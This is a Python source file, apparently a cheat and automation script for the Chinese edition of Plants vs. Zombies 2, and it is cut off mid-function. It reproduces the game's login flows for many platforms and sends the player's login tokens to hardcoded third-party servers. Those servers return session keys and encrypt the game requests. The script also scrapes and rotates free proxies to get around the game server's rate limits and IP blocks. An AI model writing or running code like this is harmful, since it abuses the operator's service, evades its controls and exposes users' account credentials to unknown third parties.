import os
import sys
import json
import time
import random
import re
import math
import hashlib
import base64
import webbrowser
import gzip
import zlib
import socket
import threading
from datetime import datetime, timedelta
from collections import deque
from typing import Optional

import requests
import urllib.parse
from colorama import Fore

def _init_server_config():
    """初始化服务器配置"""
    global GARDEN_LIKE_SERVER, GARDEN_LIKE_ACTIVATION_CODE, GARDEN_LIKE_ACCOUNTS_API
    global GARDEN_LIKE_V722_BATCH_API, GARDEN_LIKE_DECRYPT_RESPONSE_API
    global GARDEN_LIKE_DELAY, GARDEN_LIKE_TOTAL
    global UPLOAD_URL, ENCRYPT_URLS, tx_url, er_url, SERVER_URL, INFO_URL, BACKEND_URL

    GARDEN_LIKE_SERVER = "http://hf.wwszxc.tax:24494"
    GARDEN_LIKE_ACTIVATION_CODE = "CRYPTO-K75W-RK3X-HZMW-WGS8"
    GARDEN_LIKE_ACCOUNTS_API = f"{GARDEN_LIKE_SERVER}/crypto/garden-likes/accounts"
    GARDEN_LIKE_V722_BATCH_API = f"{GARDEN_LIKE_SERVER}/crypto/garden-likes/v722-batch"
    GARDEN_LIKE_DECRYPT_RESPONSE_API = f"{GARDEN_LIKE_SERVER}/crypto/garden-likes/decrypt-response"
    GARDEN_LIKE_DELAY = 0.35
    GARDEN_LIKE_TOTAL = 200

    UPLOAD_URL   = "http://1.15.63.120:5942/upload"
    ENCRYPT_URLS = ["http://1.15.63.120:5003/process_text"]
    tx_url       = "http://1.15.63.120:12138/process_text"
    er_url       = "http://1.15.63.120:5003/process_text"
    SERVER_URL   = "http://1.15.63.120:4008"
    INFO_URL     = "http://1.15.63.120:4008/info"
    BACKEND_URL  = "http://1.15.63.120:4008"

_init_server_config()

无尽延迟 = 0.05
send_多线程延迟 = 0.35

# ==================== 代理IP配置 ====================
USE_PROXY = False
PROXY_LIST = []
_current_proxy_index = 0
_proxy_pool = []
_proxy_failed_count = {}

def fetch_free_proxies():
    global PROXY_LIST
    print("\033[33m正在抓取免费代理IP...\033[0m")
    found = []
    sources = ["https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"]
    for url in sources:
        try:
            resp = requests.get(url, timeout=15)
            if resp.status_code == 200:
                for line in resp.text.strip().split('\n'):
                    line = line.strip()
                    if ':' in line:
                        proxy = f"http://{line}"
                        if proxy not in found:
                            found.append(proxy)
        except Exception as e:
            print(f"\033[31m抓取代理源失败: {e}\033[0m")
    PROXY_LIST = found
    print(f"\033[32m共抓取到 {len(PROXY_LIST)} 个代理IP\033[0m")
    return PROXY_LIST

def test_proxy(proxy, test_url="http://www.baidu.com", timeout=5):
    try:
        start = time.time()
        resp = requests.get(test_url, proxies={"http": proxy, "https": proxy}, timeout=timeout)
        elapsed = time.time() - start
        if resp.status_code == 200 and elapsed < timeout:
            return True, elapsed
    except Exception:
        pass
    return False, 999

def filter_proxies(proxy_list=None, max_workers=20, timeout=5):
    global _proxy_pool
    if proxy_list is None:
        proxy_list = PROXY_LIST
    if not proxy_list:
        return []
    print(f"\033[33m正在筛选 {len(proxy_list)} 个代理IP...\033[0m")
    import concurrent.futures
    valid_proxies = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_proxy = {executor.submit(test_proxy, proxy, timeout=timeout): proxy for proxy in proxy_list}
        for future in concurrent.futures.as_completed(future_to_proxy):
            try:
                is_valid, elapsed = future.result()
                if is_valid:
                    valid_proxies.append((future_to_proxy[future], elapsed))
            except Exception:
                pass
    valid_proxies.sort(key=lambda x: x[1])
    _proxy_pool = [p[0] for p in valid_proxies]
    print(f"\033[32m筛选完成，可用代理: {len(_proxy_pool)}\033[0m")
    return _proxy_pool

def get_current_proxy():
    if not USE_PROXY or not _proxy_pool:
        return None
    if _current_proxy_index >= len(_proxy_pool):
        _current_proxy_index = 0
    proxy = _proxy_pool[_current_proxy_index]
    return {"http": proxy, "https": proxy}

def switch_proxy(reason=""):
    global _current_proxy_index
    if not USE_PROXY or not _proxy_pool:
        return
    old_proxy = _proxy_pool[_current_proxy_index] if _current_proxy_index < len(_proxy_pool) else "未知"
    _proxy_failed_count[old_proxy] = _proxy_failed_count.get(old_proxy, 0) + 1
    if _proxy_failed_count.get(old_proxy, 0) >= 3 and old_proxy in _proxy_pool:
        _proxy_pool.remove(old_proxy)
    _current_proxy_index = (_current_proxy_index + 1) % max(len(_proxy_pool), 1)
    if reason:
        print(f"\033[33m{reason}，切换代理\033[0m")

def init_proxy():
    global USE_PROXY
    if not USE_PROXY:
        return
    fetch_free_proxies()
    if PROXY_LIST:
        filter_proxies()

def is_ip_locked(response):
    if response is None:
        return True
    try:
        if hasattr(response, 'status_code') and response.status_code == 429:
            return True
        if hasattr(response, 'text') and response.text:
            text = response.text.lower()
            for kw in ['ip', '限制', '频繁', 'too many', 'rate limit', 'blocked', 'forbidden']:
                if kw in text:
                    return True
    except Exception:
        pass
    return False

class C:
    R  = "\033[0m"
    RED = "\033[31m"
    G  = "\033[32m"
    Y  = "\033[33m"
    B  = "\033[34m"
    P  = "\033[35m"
    C  = "\033[36m"
    W  = "\033[37m"
    O  = "\033[38;5;214m"
GREEN = "\033[32m"

GAME_ERROR_CODES = {
    0:     ("ok",    ""),
    20013: ("expired", "请求文本已过期，需重新抓包"),
    20024: ("ek_expired", "ek已过期，自动刷新中..."),
    20004: ("param",   "参数错误"),
    20023: ("limit",   "次数不足"),
}

def game_err_msg(r: int) -> str:
    info = GAME_ERROR_CODES.get(r)
    if info:
        return info[1]
    return f"未知错误(r={r})"

_RUNTIME_CONFIG = None
_login_expired = False

_ACCOUNTS_MARKER = "# ===" + "PVZ2" + "_ACCOUNTS==="
_accounts_cache = None

def _get_self_path():
    try:
        return os.path.abspath(__file__)
    except Exception:
        return sys.argv[0]

def load_accounts():
    global _accounts_cache
    if _accounts_cache is not None:
        return _accounts_cache
    try:
        with open(_get_self_path(), "r", encoding="utf-8") as f:
            text = f.read()
        idx = text.find(_ACCOUNTS_MARKER)
        if idx >= 0:
            raw = text[idx + len(_ACCOUNTS_MARKER):]

            lines = []
            for line in raw.split("\n"):
                line = line.strip()
                if line.startswith("#"):
                    line = line[1:].strip()
                if line:
                    lines.append(line)
            data = "".join(lines)
            if data:
                _accounts_cache = json.loads(base64.b64decode(data).decode("utf-8"))
                return _accounts_cache
    except Exception:
        pass
    _accounts_cache = []
    return _accounts_cache

def save_accounts(accounts):
    global _accounts_cache
    _accounts_cache = accounts
    try:
        with open(_get_self_path(), "r", encoding="utf-8") as f:
            text = f.read()
        encoded = base64.b64encode(json.dumps(accounts, ensure_ascii=False).encode("utf-8")).decode("ascii")
        idx = text.find(_ACCOUNTS_MARKER)

        _comment_lines = []
        for _i in range(0, len(encoded), 80):
            _comment_lines.append("# " + encoded[_i:_i+80])
        _comment_data = "\n".join(_comment_lines)
        if idx >= 0:
            text = text[:idx + len(_ACCOUNTS_MARKER)] + "\n" + _comment_data + "\n"
        else:
            text = text.rstrip() + "\n\n" + _ACCOUNTS_MARKER + "\n" + _comment_data + "\n"
        with open(_get_self_path(), "w", encoding="utf-8") as f:
            f.write(text)
    except Exception as e:
        print(f"{C.RED}保存账号失败：{e}{C.R}")

def _make_account_name(cfg, ui, platform):
    nick = ""
    try:
        if "content" in cfg:
            c = cfg["content"]
            if isinstance(c, str):
                c = json.loads(c)
            nick = c.get("nick", "") or c.get("channelUserInfo", {}).get("channelNickName", "")
    except Exception:
        pass
    if "pt" in cfg and "userid" in cfg["pt"]:
        cid = cfg.get("channel_id", 0)
        ch = {208: "官服", 250: "tap", 261: "好游", 215: "红魔"}.get(cid, f"渠道{cid}")
        base = f"{ch}-{cfg['pt']['userid']}"
    elif "key" in cfg and "message" in cfg:
        base = f"iOS-{ui}"
    else:
        code = cfg.get("code", "")
        ch_map = {"0000": "4399", "b站": "B站", "九游": "九游", "微信": "微信", "qq": "QQ", "QQ": "QQ",
                  "oppo": "OPPO", "OPPO": "OPPO", "vivo": "vivo", "小米": "小米", "华为": "华为",
                  "taptap": "TapTap", "TapTap": "TapTap", "荣耀": "荣耀", "应用宝": "应用宝"}
        ch = ch_map.get(code, code or "")
        if not ch:
            try:
                account_name = cfg.get("account", {}).get("accountName", "")
                if account_name:
                    for ch_name in ["华为", "小米", "OPPO", "vivo", "荣耀", "应用宝", "TapTap"]:
                        if ch_name in account_name:
                            ch = ch_name
                            break
            except Exception:
                pass
        if not ch:

            if "atk" in cfg and "openid" in cfg:
                ch = "微信"
            elif "oi" in cfg and "access_token" in cfg:
                ch = "QQ"
            elif "hwt" in cfg:
                ch = "华为"
            elif "ryt" in cfg:
                ch = "荣耀"
            elif "ssoid" in cfg or ("roleid" in cfg and "ticket" in cfg):
                ch = "OPPO"
            elif "authToken" in cfg and "t" in cfg and isinstance(cfg.get("t"), str) and cfg["t"].startswith("_STV1_"):
                ch = "vivo"
            elif "game" in cfg and isinstance(cfg.get("game"), dict) and "appAccountId" in cfg["game"]:

                oauth = cfg.get("oauth", {})
                oauth_key = oauth.get("key", "") if isinstance(oauth, dict) else ""
                if not oauth_key:
                    ch = "小米"
                else:
                    ch = "应用宝"
            elif "account" in cfg and "game" in cfg and "oauth" in cfg and "ok" in cfg:
                ch = "应用宝"
            elif "t" in cfg and isinstance(cfg.get("t"), str) and "TapTap" in cfg["t"]:
                ch = "TapTap"
        if not ch:
            ch = "第三方"
        base = f"{ch}-{ui}"
    return f"{base}({nick})" if nick else base

def _get_player_nickname():
    try:
        pi, ui, sk = session.pi, session.ui, session.sk
        if not pi or not sk or not ui:
            return ""
        data = {"req": "V203", "e": {"pi": pi, "sk": sk, "ui": ui}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        decrypted_response = get_decrypted_data(url, data=response)
        decrypted_json = json.loads(decrypted_response)
        inner = decrypted_json.get("e", {}).get("d", {}).get("pr", {})
        p_value = inner.get("p", "")
        if not p_value:
            return ""
        if session.platform == "ios":
            p_value = p_value.replace("-", "+").replace("_", "/")
            p_value += "=" * (4 - (len(p_value) % 4))
            raw = gzip.decompress(base64.b64decode(p_value)).decode("utf-8")
            for line in raw.splitlines():
                line = line.replace("-", "+").replace("_", "/").replace(",", "")
                line += "=" * (4 - (len(line) % 4))
                try:
                    d = json.loads(base64.b64decode(line).decode("utf-8"))
                    nick = d.get("sd", {}).get("n", "")
                    if nick:
                        return nick
                except Exception:
                    continue
            return ""
        else:
            pb = p_value.encode("utf-8").replace(b"-", b"+").replace(b"_", b"/").replace(b",", b"")
            pb += b"=" * (4 - (len(pb) % 4))
            d = json.loads(base64.b64decode(pb).decode("utf-8"))
            return d.get("sd", {}).get("n", "") or ""
    except Exception:
        pass
    return ""

def add_account(cfg, ui, platform):
    accounts = load_accounts()
    nick = _get_player_nickname()
    if not nick:
        try:
            if "content" in cfg:
                c = cfg["content"]
                if isinstance(c, str):
                    c = json.loads(c)
                nick = c.get("nick", "") or c.get("channelUserInfo", {}).get("channelNickName", "")
        except Exception:
            pass
    for acc in accounts:
        if acc.get("ui") == ui and acc.get("platform") == platform:
            acc["cfg"] = cfg
            acc["name"] = _make_account_name(cfg, ui, platform)
            acc["nickname"] = nick
            save_accounts(accounts)
            return
    accounts.append({
        "id": len(accounts) + 1,
        "name": _make_account_name(cfg, ui, platform),
        "ui": ui,
        "platform": platform,
        "nickname": nick,
        "cfg": cfg
    })
    save_accounts(accounts)

def delete_account(idx):
    accounts = load_accounts()
    if 0 <= idx < len(accounts):
        accounts.pop(idx)
        for i, acc in enumerate(accounts):
            acc["id"] = i + 1
        save_accounts(accounts)
        return True
    return False
_login_expired = False

def load_config():
    if _RUNTIME_CONFIG is not None:
        return dict(_RUNTIME_CONFIG)
    return {}

def get_login_config(cfg):
    """从 config dict 提取发给加密上传服务的 content。返回 None 表示无效。"""
    if not cfg:
        return None

    if "key" in cfg and "message" in cfg:
        msg = cfg["message"]
        if isinstance(msg, str) and "iOS" in msg:
            return cfg

    if cfg.get("code") == "0000":
        content = cfg.get("content", "")
        try:
            co = json.loads(content) if isinstance(content, str) else content
        except Exception:
            return None
        lt = co.get("channelUserInfo", {}).get("loginToken", "")
        if lt.endswith("4399"):
            return {
                "channel_id": 54,
                "channelSdkVersion": "dj2.2-3.14.4.574",
                "pt": {"token": content}
            }
        return None
    elif cfg.get("code") == "b站":
        return {
                "channel_id": 10024,
                "channelSdkVersion": "dj2.0-5.9.8",
                "pt": {"token": cfg.get("content", "")}
            }

    elif cfg.get("code") == "九游":
        return {
                "channel_id": 24,
                "channelSdkVersion": "dj2.0-9.8.10.2_7.8.5.0",
                "pt": {"token": cfg.get("content", "")}
            }

    elif cfg.get("code") == "360":
        return {
                "channel_id": 16,
                "channelSdkVersion": "dj2.1-1002.4.0.816",
                "pt": {"token": cfg.get("content", "")}
            }

    elif "atk" in cfg and "openid" in cfg:

        channelUserId = cfg["openid"]
        loginToken = cfg["atk"] + "|WX"

        cfg = {
            "code": "微信",
            "content": json.dumps(
                {
                    "channelUserInfo": {
                        "channelUserId": channelUserId,
                        "loginToken": loginToken
                    },
                    "loginIdentity": channelUserId
                },
                ensure_ascii=False
            )
        }

        return {
                "channel_id": 132,
                "channelSdkVersion": "dj2.0-2.2.3",
                "pt": {"token": cfg.get("content", "")}
            }

    elif "oi" in cfg and "access_token" in cfg:

        channelUserId = cfg["oi"]
        loginToken = cfg["access_token"] + "|QQ"

        cfg = {
            "code": "qq",
            "content": json.dumps(
                {
                    "channelUserInfo": {
                        "channelUserId": channelUserId,
                        "loginToken": loginToken
                    },
                    "loginIdentity": channelUserId
                },
                ensure_ascii=False
            )
        }

        return {
                "channel_id": 132,
                "channelSdkVersion": "dj2.0-2.2.3",
                "pt": {"token": cfg.get("content", "")}
            }

    elif "roleid" in cfg and "ticket" in cfg:

        roleid = cfg.get("roleid")
        if roleid is None or roleid == "":
            channelUserId = cfg.get("ssoid")
        else:
            channelUserId = roleid

        loginToken = cfg["ticket"]

        cfg = {
            "code": "oppo",
            "content": json.dumps(
                {
                    "channelUserInfo": {
                        "channelUserId": channelUserId,
                        "loginToken": loginToken
                    },
                    "loginIdentity": channelUserId
                },
                ensure_ascii=False
            )
        }

        return {
                "channel_id": 22,
                "channelSdkVersion": "dj3.0-3.0.9.101",
                "pt": {"token": cfg.get("content", "")}
            }

    elif "authToken" in cfg and "oi" in cfg:

        channelUserId = cfg.get("oi")
        loginToken = cfg["authToken"]

        cfg = {
            "code": "vivo",
            "content": json.dumps(
                {
                    "channelUserInfo": {
                        "channelUserId": channelUserId,
                        "loginToken": loginToken
                    },
                    "loginIdentity": channelUserId
                },
                ensure_ascii=False
            )
        }

        return {
                "channel_id": 1027,
                "channelSdkVersion": "dj2.0-4.8.2.0",
                "pt": {"token": cfg.get("content", "")}
            }

    elif "token" in cfg and "ssoid" in cfg:

        channelUserId = cfg.get("ssoid")
        loginToken = cfg["token"]

        cfg = {
            "code": "oppo",
            "content": json.dumps(
                {
                    "channelUserInfo": {
                        "channelUserId": channelUserId,
                        "loginToken": loginToken
                    },
                    "loginIdentity": channelUserId
                },
                ensure_ascii=False
            )
        }

        return {
                "channel_id": 1027,
                "channelSdkVersion": "dj2.0-4.8.2.0",
                "pt": {"token": cfg.get("content", "")}
            }

    elif "game" in cfg and "oauth" in cfg:

        channelUserId = cfg["game"]["oi"]
        loginToken = cfg["game"]["session"]

        cfg = {
            "code": "小米",
            "content": json.dumps(
                {
                    "channelUserInfo": {
                        "channelUserId": channelUserId,
                        "loginToken": loginToken
                    },
                    "loginIdentity": channelUserId
                },
                ensure_ascii=False
            )
        }

        return {
                "channel_id": 1013,
                "channelSdkVersion": "dj2.0-3.4.3",
                "pt": {"token": cfg.get("content", "")}
            }

    elif "oi" in cfg and "hwt" in cfg:

        channelUserId = cfg["oi"]
        loginToken = cfg["hwt"]

        cfg = {
            "code": "华为",
            "content": json.dumps(
                {
                    "channelUserInfo": {
                        "channelUserId": channelUserId,
                        "loginToken": loginToken
                    },
                    "loginIdentity": channelUserId
                },
                ensure_ascii=False
            )
        }
        return {
                "channel_id": 1030,
                "channelSdkVersion": "dj2.2-6.10.0.300",
                "pt": {"token": cfg.get("content", "")}
            }

    elif "unionid" in cfg and "game" in cfg:

        channelUserId = cfg["game"]["openId"]
        loginToken = cfg["game"]["t"]

        cfg = {
            "code": "taptap",
            "content": json.dumps(
                {
                    "channelUserInfo": {
                        "channelUserId": channelUserId,
                        "loginToken": loginToken
                    },
                    "loginIdentity": channelUserId
                },
                ensure_ascii=False
            )
        }
        return {
                "channel_id": 250,
                "channelSdkVersion": "dj4.0-4.10.4",
                "pt": {"token": cfg.get("content", "")}
            }

    elif "oi" in cfg and "ryt" in cfg:

        channelUserId = cfg["oi"]
        loginToken = cfg["ryt"]

        cfg = {
            "code": "荣耀",
            "content": json.dumps(
                {
                    "channelUserInfo": {
                        "channelUserId": channelUserId,
                        "loginToken": loginToken
                    },
                    "loginIdentity": channelUserId
                },
                ensure_ascii=False
            )
        }
        return {
                "channel_id": 1003,
                "channelSdkVersion": "dj2.0-2.0.26.301",
                "pt": {"token": cfg.get("content", "")}
            }

    cid = cfg.get("channel_id")
    if str(cid) in ("208", "250", "261", "215"):

        return cfg

    return None

def _fastest_encrypt_url(timeout=3.0):
    best, bm = ENCRYPT_URLS[0], float("inf")
    for u in ENCRYPT_URLS:
        try:
            t0 = time.time(); requests.get(u, timeout=timeout); ms = (time.time()-t0)*1000
            if ms < bm: best, bm = u, ms
        except Exception:
            pass
    return best

class GameSession:
    def __init__(self):
        self.ek = ""
        self.ui = ""
        self.sk = ""
        self.pi = ""
        self.platform = ""
        self.and_url = ""
        self.and_url2 = ""
        self.package = ""
        self.jiami = {}
        self.encrypt_url = ""
        self.version = "9.9.8"
        self.channel = "com.popcap.pvz2cthdbk"
        self.logged_in = False

    def get_pi_sk(self):
        return self.pi, self.ui, self.sk

    def _setup_and_url(self):
        if self.platform == "ios":
            self.and_url = "http://cloudpvz2ios.ditwan.cn/index.php"
            self.and_url2 = "http://cloudpvz2ios.ditwan.cn"
        else:
            self.and_url = "http://cloudpvz2android.ditwan.cn/index.php"
            self.and_url2 = "http://cloudpvz2android.ditwan.cn"

    def _sync_globals(self):
        g = globals()
        g["加密"] = self.jiami
        g["ek_val"] = self.ek
        g["ui_val"] = self.ui
        g["sk_val"] = self.sk
        g["pi_val"] = self.pi
        g["pingtai"] = self.platform
        g["and_url"] = self.and_url
        g["and_url2"] = self.and_url2
        g["package"] = self.package
        g["url"] = self.encrypt_url

    def _apply_login_response(self, j):
        """处理加密服务返回的登录 JSON，设置所有字段。返回 bool。"""
        if not j or "error" in j and j["error"]:
            err = j.get("error", "未知错误") if j else "空响应"
            print(f"{C.RED}登入失败：{err}{C.R}")
            return False
        if not j.get("ek"):
            print(f"{C.RED}登入失败：响应无ek{C.R}")
            return False
        self.jiami = j
        self.ek = j.get("ek", "")
        d = j.get("v202_data", {}).get("d", {})
        self.ui = d.get("ui", "")
        self.sk = d.get("sk", "")
        new_pi = d.get("pi")
        if new_pi is not None:
            self.pi = new_pi
            self.platform = "ios"
        else:
            self.platform = "安卓"
            self.pi = self.ui
        self._setup_and_url()
        return True

    def _do_shibie_check(self):
        """发送 V303 探测请求，验证 ek/pi/ui/sk 是否可用。"""
        try:
            self._sync_globals()
            shibie(self.pi, self.ui, self.sk)
            g = globals()
            self.package = g.get("package", self.package)
            self.and_url = g.get("and_url", self.and_url)
            self.and_url2 = g.get("and_url2", self.and_url2)
            self._sync_globals()
            return True
        except Exception as e:

            err_str = str(e)
            if err_str not in ("'body'", "'data'"):
                print(f"{C.Y}连通性检查警告：{e}{C.R}")

            if not self.and_url:
                self.and_url = "http://cloudpvz2.ditwan.cn/index.php"
            if not self.and_url2:
                self.and_url2 = "http://cloudpvz2.ditwan.cn"
            return True

    def login(self, new_config) -> bool:
        """通过上传服务获取 ek 等登录态。new_config 为发给 UPLOAD_URL 的 content。"""
        old = '''{"ek":"ek","v202_data":{"d":{"ui":"ui","sk":"sk"}}}'''
        try:
            r = requests.post(UPLOAD_URL, json={"content": new_config}, timeout=15)
            j = json.loads(r.text)
            o = json.loads(old)
            n = j
            pi = ui = sk = ek = None
            if "attempts" in n:
                stack = [n]
                while stack:
                    x = stack.pop()
                    if isinstance(x, dict):
                        for k, v in x.items():
                            if k == "pi":
                                pi = v
                            elif k == "ui":
                                ui = v
                            elif k == "sk":
                                sk = v
                            elif k == "ek":
                                ek = v
                            else:
                                stack.append(v)
                    elif isinstance(x, list):
                        stack += x
                def walk(x):
                    if isinstance(x, dict):
                        out = {}
                        for k, v in x.items():
                            if k == "ui" and ui:
                                out["ui"] = ui
                                if pi:
                                    out["pi"] = pi
                            elif k == "sk" and sk:
                                out["sk"] = sk
                            elif k == "ek" and ek:
                                out["ek"] = ek
                            else:
                                out[k] = walk(v)
                        return out
                    elif isinstance(x, list):
                        return [walk(i) for i in x]
                    return x
                j = walk(o)
        except Exception as e:
            print(f"{C.RED}登入请求失败：{e}{C.R}")
            return False
        if not self._apply_login_response(j):
            return False
        self.encrypt_url = _fastest_encrypt_url()
        self.logged_in = True
        global _suppress_post_errors
        _suppress_post_errors = True
        self._do_shibie_check()
        _suppress_post_errors = False
        self._sync_globals()
        global _login_expired
        _login_expired = False

        return True

    def refresh_ek(self) -> bool:
        """ek 过期时重新获取。"""
        cfg = load_config()
        nc = get_login_config(cfg)
        if nc is None:
            print(f"{C.RED}配置无效，请重新登入{C.R}")
            return False
        ok = self.login(nc)
        return ok

    def encrypt(self, plain_data, timeout=15.0, max_retries=3):
        d = dict(plain_data)
        d["ek"] = self.ek

        if isinstance(d.get("e"), dict):
            d["e"]["pi"] = self.pi
            d["e"]["sk"] = self.sk
            d["e"]["ui"] = self.ui
        if self.platform == "ios":
            rv = d.get("req")
            if rv == "V316": d["req"] = "V216"
            elif rv == "V203": d["req"] = "V210"
            elif rv == "V206": d["req"] = "V205"
        js = json.dumps(d, separators=(",", ":"))
        last = None
        for _ in range(max_retries):
            try:
                r = requests.post(self.encrypt_url, data=js, timeout=(timeout, timeout))
                rd = json.loads(r.text)
                return rd["body"], rd["headers"]
            except Exception as e:
                last = e; time.sleep(0.3)
        print(f"{C.RED}加密服务请求失败：{last}{C.R}")
        return None

    def decrypt(self, resp_text, max_retries=3) -> Optional[dict]:
        for _ in range(max_retries):
            try:
                raw = json.loads(resp_text)
                raw["ek"] = self.ek
                r = requests.post(self.encrypt_url,
                                  data=json.dumps(raw, separators=(",", ":")),
                                  timeout=(5, 5))
                rr = json.loads(r.text)
                if "body" not in rr:
                    time.sleep(0.3); continue
                rd = json.loads(rr["body"])
                rd["e"] = {"d": rd.pop("d")}
                return rd
            except Exception:
                time.sleep(0.3); continue
        return None

    def post(self, plain_data, success_msg="", fail_msg="",
             max_ek_retry=3, decrypt=True) -> dict:
        """统一入口：加密 -> 发送 -> 处理错误码 -> (可选)解密 -> 返回明文字典。
        返回值：解密后的明文字典，包含 'r' 字段；失败时返回 {'r':-1,'error':...}。
        """
        for attempt in range(max_ek_retry + 1):
            enc = self.encrypt(plain_data)
            if enc is None:
                return {"r": -1, "error": "encrypt_failed"}
            body, head = enc
            try:
                resp = requests.post(self.and_url, headers=head, data=body, timeout=15)
                raw_text = resp.text
                rd_raw = json.loads(raw_text)
            except Exception as e:
                print(f"{C.RED}请求异常：{e}{C.R}")
                return {"r": -2, "error": str(e)}
            rv = rd_raw.get("r")
            if rv == 20024:
                if attempt >= max_ek_retry:
                    print(f"{C.RED}ek过期，多次刷新后仍失败{C.R}")
                    return rd_raw
                print(f"{C.Y}{game_err_msg(20024)}{C.R}")
                if not self.refresh_ek():
                    return rd_raw

                if isinstance(plain_data.get("e"), dict):
                    plain_data["e"]["pi"] = self.pi
                    plain_data["e"]["sk"] = self.sk
                    plain_data["e"]["ui"] = self.ui
                if "ek" in plain_data:
                    del plain_data["ek"]
                continue

            tag, msg = GAME_ERROR_CODES.get(rv, ("unknown", ""))
            if rv == 0:
                if success_msg:
                    print(f"{C.G}{success_msg}{C.R}")
            elif rv == 20013:
                print(f"{C.RED}{msg}{C.R}")
            elif rv != 0:
                out = fail_msg if fail_msg else (msg if msg else f"失败(r={rv})")
                print(f"{C.RED}{out}{C.R}")
            if decrypt and rv == 0:
                dec = self.decrypt(raw_text)
                if dec is not None:
                    return dec
                return {"r": -3, "error": "decrypt_failed", "_raw": rd_raw}
            return rd_raw
        return {"r": -4, "error": "max_retry"}

session = GameSession()
TASKS = {}
def register(category, name, yijian=False):
    def deco(fn):
        TASKS.setdefault(category, {})[fn.__name__] = {
            "name": name, "fn": fn, "yijian": yijian,
        }
        return fn
    return deco

def define_categories(cats):
    global CATEGORIES
    CATEGORIES = list(cats)

define_categories([
    ("daily",        "日常类活动"),
    ("one_time",     "一次性任务"),
    ("pvp",          "双人对决"),
    ("memory",       "回忆之旅"),
    ("chase",        "追击模式"),
    ("endless",      "无尽模式"),
    ("secret",       "秘境模式"),
    ("garden",       "创意庭院"),
    ("jubaopen",     "聚宝盆"),
    ("zhaguan",      "欢乐砸罐"),
    ("wanhui",       "周年庆晚会"),
    ("taotuo",       "僵局逃脱"),
    ("tongyou",      "同游活动"),
    ("dingding",     "响叮当"),
    ("limited",      "限时活动"),
    ("family",       "刷家族"),
    ("transgene",    "转基因类"),
    ("save",         "存档类"),
    ("lingying",     "令营类"),
])

def _disp_width(s):
    return sum(2 if ord(c) > 127 else 1 for c in s)

def _show_menu(title, items, num_columns=1, column_spacing=2, fancy=False):
    if fancy:
        _title = "《植物大战僵尸2脚本》"
        _tw = _disp_width(_title)
        _pad = (60 - _tw) // 2
        print(f"\n{' ' * _pad}{C.C}{_title}{C.R}")
        print("=" * 60)
        n = len(items)
        cols = 4
        rows = (n + cols - 1) // cols
        col_colors = ["\033[38;5;174m", "\033[38;5;150m", "\033[38;5;110m", "\033[38;5;179m"]

        col_widths = [0] * cols
        for idx in range(n):
            col = idx % cols
            w = _disp_width(f"{idx+1}:{items[idx][1]}")
            if w > col_widths[col]:
                col_widths[col] = w
        for col in range(cols):
            col_widths[col] += 4

        for row in range(rows):
            line = ""
            for col in range(cols):
                idx = row * cols + col
                if idx < n:
                    color = col_colors[col]
                    text = f"{idx+1}:{items[idx][1]}"
                    pad = col_widths[col] - _disp_width(text)
                    line += f"{color}{text}{C.R}" + " " * pad
                else:
                    line += " " * col_widths[col]
            print(line.rstrip())
        print("=" * 60)
        while True:
            c = input("\n请选择: ").strip()
            if not c or c.lower() == "q":
                return None
            if c.isdigit() and 1 <= int(c) <= len(items):
                return int(c) - 1
            print("无效选项，请重新选择。")
    print(f"\n===== {title} =====")
    if num_columns <= 1:
        for i, (_, name) in enumerate(items, 1):
            print(f" {i}. {name}")
    else:
        n = len(items)
        col_width = max(_disp_width(f" {i}. {name}") for i,(_,name) in enumerate(items,1)) + column_spacing
        rows = (n + num_columns - 1) // num_columns
        lines = ["" for _ in range(rows)]
        for col in range(num_columns):
            for row in range(rows):
                idx = col*rows + row
                if idx >= n: continue
                s = f" {idx+1}. {items[idx][1]}"
                pad = col_width - _disp_width(s)
                lines[row] += s + " " * pad
        for ln in lines: print(ln.rstrip())
    print("\n空回车. 返回上级")
    while True:
        c = input("\n请选择: ").strip()
        if not c:
            return None
        if c.isdigit() and 1 <= int(c) <= len(items):
            return int(c) - 1
        print("无效选项，请重新选择。")

def run_category(ckey):
    tasks = TASKS.get(ckey, {})
    if not tasks:
        print(f"{C.Y}该分类暂无已迁移功能{C.R}"); time.sleep(1); return
    items = list(tasks.items())
    ncol = 2 if ckey == "secret" else 1
    while True:
        idx = _show_menu(dict(CATEGORIES).get(ckey, ckey),
                         [(k, v["name"]) for k, v in items],
                         num_columns=ncol, column_spacing=2)
        if idx is None:
            return
        _, info = items[idx]
        try:
            info["fn"]()
        except Exception as e:
            if isinstance(e, KeyError) and str(e) == "'data'":
                print(f"{C.RED}活动已结束或未开放{C.R}")
            else:
                print(f"{C.RED}执行出错：{e}{C.R}")

def run_dengru():
    global _RUNTIME_CONFIG
    print(f"\n{C.C}===== 登录管理 ====={C.R}")

    cur_cfg = load_config()
    cur_nc = get_login_config(cur_cfg)
    if cur_nc and session.logged_in and _login_expired:
        print(f"{C.RED}当前登录态已过期，请重新登录（ui={session.ui} 平台={session.platform}）{C.R}")
    elif cur_nc and session.logged_in:
        print(f"{C.G}当前已登录：ui={session.ui} 平台={session.platform}{C.R}")
    elif cur_nc:
        print(f"{C.Y}已有配置但未登录{C.R}")
    else:
        print(f"{C.Y}暂无有效登录配置{C.R}")
    while True:
        print(f"\n{C.C}请选择登录方式：{C.R}")
        print(" 1. 账密登录（官服/tap/好游快爆/努比亚红魔/4399）")
        print(" 2. 抓包响应（4399/b站/九游/iOS）")
        print(" 3. 第三方获取登录响应（应用宝/oppo/vivo/小米/华为/taptap/荣耀）")
        accounts = load_accounts()
        if accounts:
            print(f" 4. 选择已保存账号登录（共{len(accounts)}个）")
            print(" 5. 删除已保存账号")
        print(" （回车返回）")
        choice = input("\n请选择: ").strip()
        if not choice:
            return
        cfg = None
        if choice == "1":
            cfg = _login_by_account()
        elif choice == "2":
            cfg = _login_by_capture()
        elif choice == "3":
            cfg = _login_by_third_party()
        elif choice == "4" and accounts:
            print(f"\n{C.C}已保存账号列表：{C.R}")
            for i, acc in enumerate(accounts, 1):
                nick_str = f" 昵称:{acc.get('nickname','')}" if acc.get('nickname') else ""

                disp_name = _make_account_name(acc.get('cfg', {}), acc.get('ui', ''), acc.get('platform', ''))
                print(f" {i}. {disp_name}（ui={acc['ui']} {acc['platform']}{nick_str}）")
            sel = input("请选择序号（回车返回）: ").strip()
            if not sel:
                continue
            try:
                idx = int(sel) - 1
                if 0 <= idx < len(accounts):
